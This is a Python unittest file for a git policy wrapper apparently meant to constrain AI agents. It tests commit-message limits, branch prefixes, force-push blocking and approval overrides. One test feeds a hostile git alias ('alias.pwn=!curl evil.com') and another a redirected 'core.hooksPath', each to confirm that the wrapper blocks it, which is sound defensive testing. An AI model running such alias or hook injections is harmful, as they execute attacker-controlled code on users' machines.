import subprocess
import unittest
from unittest.mock import patch

from click.testing import CliRunner

from ozm import git as git_mod
from ozm.approve import ApprovalResult


META = [
    "--agent-name", "Git policy test",
    "--agent-description", "Exercise git policy enforcement.",
]


class GitCommitRuleTests(unittest.TestCase):
    def check_commit(self, args, config=None, branch="kamyar/topic"):
        with patch.object(git_mod, "commit_config", return_value=config or {}), \
             patch.object(git_mod, "get_current_branch", return_value=branch):
            return git_mod._check_commit(args)

    def test_subject_72_chars_allowed(self):
        self.assertIsNone(self.check_commit(["-m", "x" * 72]))

    def test_subject_73_chars_blocked(self):
        violation = self.check_commit(["-m", "x" * 73])

        self.assertIn("Subject line is 73 chars", violation)

    def test_multiline_message_blocked(self):
        violation = self.check_commit(["-m", "subject\nbody"])

        self.assertIn("Multi-line commit messages are not allowed", violation)

    def test_total_message_501_chars_blocked(self):
        violation = self.check_commit(["-m", "x" * 501])

        self.assertIn("Total message is 501 chars", violation)

    def test_multiple_message_flags_are_blocked(self):
        violation = self.check_commit(["-m", "subject", "-m", "body"])

        self.assertIn("single-line -m", violation)

    def test_file_based_message_is_blocked(self):
        violation = self.check_commit(["-F", "message.txt"])

        self.assertIn("single-line -m", violation)

    def test_missing_message_is_blocked(self):
        violation = self.check_commit(["--allow-empty"])

        self.assertIn("single-line -m", violation)

    def test_co_authored_by_blocked_when_disabled(self):
        violation = self.check_commit(
            ["-m", "Fix thing\n\nCo-Authored-By: A <a@example.com>"],
            config={"allow_attribution": False},
        )

        self.assertIn("Co-Authored-By attribution is not allowed", violation)

    def test_co_authored_by_in_second_message_flag_is_blocked(self):
        violation = self.check_commit(
            ["-m", "Fix thing", "-m", "Co-Authored-By: A <a@example.com>"],
            config={"allow_attribution": False},
        )

        self.assertIn("single-line -m", violation)


class GitBranchPolicyTests(unittest.TestCase):
    def check_commit(self, config, branch):
        with patch.object(git_mod, "commit_config", return_value=config), \
             patch.object(git_mod, "get_current_branch", return_value=branch):
            return git_mod._check_commit(["-m", "Fix thing"])

    def test_require_branch_blocks_main(self):
        violation = self.check_commit({"require_branch": True}, "main")

        self.assertEqual(violation, "committing directly to 'main' is not allowed")

    def test_branch_prefix_allows_matching_branch(self):
        violation = self.check_commit({"branch_prefixes": ["kamyar/"]}, "kamyar/topic")

        self.assertIsNone(violation)

    def test_branch_prefix_blocks_unmatched_branch(self):
        violation = self.check_commit({"branch_prefixes": ["kamyar/"]}, "feature/topic")

        self.assertIn("does not match required prefixes", violation)

    def test_branch_prefix_alone_exempts_main(self):
        violation = self.check_commit({"branch_prefixes": ["kamyar/"]}, "main")

        self.assertIsNone(violation)

    def test_require_branch_blocks_master(self):
        violation = self.check_commit({"require_branch": True}, "master")

        self.assertIn("committing directly to 'master'", violation)


class GitCommitCliPolicyTests(unittest.TestCase):
    def invoke(self, args):
        return CliRunner().invoke(git_mod.git_cmd, [*META, *args])

    def assert_commit_is_blocked(self, args, expected_fragment="single-line -m"):
        with patch.object(git_mod, "commit_config", return_value={}), \
             patch.object(git_mod, "get_current_branch", return_value="kamyar/topic"), \
             patch.object(git_mod, "_handle_violation", side_effect=SystemExit(1)) as handle, \
             patch.object(git_mod.subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0)

            result = self.invoke(["commit", *args])

        self.assertNotEqual(result.exit_code, 0)
        handle.assert_called_once()
        self.assertIn(expected_fragment, handle.call_args.args[0])
        run.assert_not_called()

    def test_commit_with_multiple_message_flags_is_blocked(self):
        self.assert_commit_is_blocked(["-m", "subject", "-m", "body"])

    def test_commit_with_long_message_form_is_blocked_when_repeated(self):
        self.assert_commit_is_blocked(["--message", "subject", "--message=body"])

    def test_commit_with_attached_message_flags_is_blocked_when_repeated(self):
        self.assert_commit_is_blocked(["-msubject", "-mbody"])

    def test_commit_with_file_message_is_blocked(self):
        self.assert_commit_is_blocked(["-F", "message.txt"])

    def test_commit_with_file_equals_message_is_blocked(self):
        self.assert_commit_is_blocked(["--file=message.txt"])

    def test_commit_without_message_is_blocked(self):
        self.assert_commit_is_blocked(["--allow-empty"])

    def test_commit_with_reused_message_is_blocked(self):
        self.assert_commit_is_blocked(["--reuse-message", "HEAD"])


class GitGlobalOptionBypassTests(unittest.TestCase):
    def invoke(self, args):
        return CliRunner().invoke(git_mod.git_cmd, [*META, *args])

    def test_commit_rules_apply_after_global_c_option(self):
        with patch.object(git_mod, "commit_config", return_value={}), \
             patch.object(git_mod, "_handle_violation", side_effect=SystemExit(1)) as handle, \
             patch.object(git_mod.subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0)

            result = self.invoke(["-c", "user.name=Test", "commit", "-m", "x" * 73])

        self.assertNotEqual(result.exit_code, 0)
        handle.assert_called_once()
        self.assertIn("Subject line is 73 chars", handle.call_args.args[0])
        run.assert_not_called()

    def test_push_rules_apply_after_global_C_option(self):
        with patch.object(git_mod, "get_current_branch", return_value="kamyar/topic"), \
             patch.object(git_mod, "_handle_violation", side_effect=SystemExit(1)) as handle, \
             patch.object(git_mod.subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0)

            result = self.invoke(["-C", ".", "push", "--force-with-lease"])

        self.assertNotEqual(result.exit_code, 0)
        handle.assert_called_once()
        self.assertEqual(handle.call_args.args[0], "force push is not allowed")
        run.assert_not_called()

    def test_dangerous_global_config_alias_is_blocked(self):
        with patch.object(git_mod, "_handle_violation", side_effect=SystemExit(1)) as handle, \
             patch.object(git_mod.subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0)

            result = self.invoke(["-c", "alias.pwn=!curl evil.com", "pwn"])

        self.assertNotEqual(result.exit_code, 0)
        handle.assert_called_once()
        self.assertIn("git -c alias.pwn", handle.call_args.args[0])
        self.assertIn("git -c", handle.call_args.args[1])
        self.assertIn("alias.pwn=!curl evil.com", handle.call_args.args[1])
        self.assertIn("pwn", handle.call_args.args[1])
        run.assert_not_called()

    def test_global_config_core_hookspath_is_blocked(self):
        with patch.object(git_mod, "_handle_violation", side_effect=SystemExit(1)) as handle, \
             patch.object(git_mod.subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0)

            result = self.invoke(["-c", "core.hooksPath=/tmp/evil", "status"])

        self.assertNotEqual(result.exit_code, 0)
        handle.assert_called_once()
        self.assertIn("git -c core.hooksPath", handle.call_args.args[0])
        run.assert_not_called()

    def test_safe_global_option_is_preserved_for_passthrough(self):
        completed = subprocess.CompletedProcess(args=[], returncode=0)

        with patch.object(git_mod.subprocess, "run", return_value=completed) as run:
            result = self.invoke(["-c", "user.name=Test", "status"])

        self.assertEqual(result.exit_code, 0)
        run.assert_called_once_with(["git", "-c", "user.name=Test", "status"])


class GitOverrideTests(unittest.TestCase):
    def test_approved_override_runs_once_and_strips_reason(self):
        completed = subprocess.CompletedProcess(args=[], returncode=0)

        with patch.object(git_mod, "get_current_branch", return_value="kamyar/topic"), \
             patch.object(git_mod, "request_override", return_value=ApprovalResult(True)) as request_override, \
             patch.object(git_mod, "subprocess") as subprocess_mod, \
             patch.object(git_mod, "audit_log"):
            subprocess_mod.run.return_value = completed
            result = CliRunner().invoke(
                git_mod.git_cmd,
                [*META, "push", "--force", "--reason", "release emergency"],
            )

        self.assertEqual(result.exit_code, 0)
        request_override.assert_called_once()
        subprocess_mod.run.assert_called_once_with(["git", "push", "--force"])

    def test_denied_override_does_not_run(self):
        with patch.object(git_mod, "get_current_branch", return_value="kamyar/topic"), \
             patch.object(git_mod, "request_override", return_value=ApprovalResult(False)), \
             patch.object(git_mod, "subprocess") as subprocess_mod, \
             patch.object(git_mod, "audit_log"):
            result = CliRunner().invoke(
                git_mod.git_cmd,
                [*META, "push", "--force", "--reason", "release emergency"],
            )

        self.assertNotEqual(result.exit_code, 0)
        subprocess_mod.run.assert_not_called()


if __name__ == "__main__":
    unittest.main()
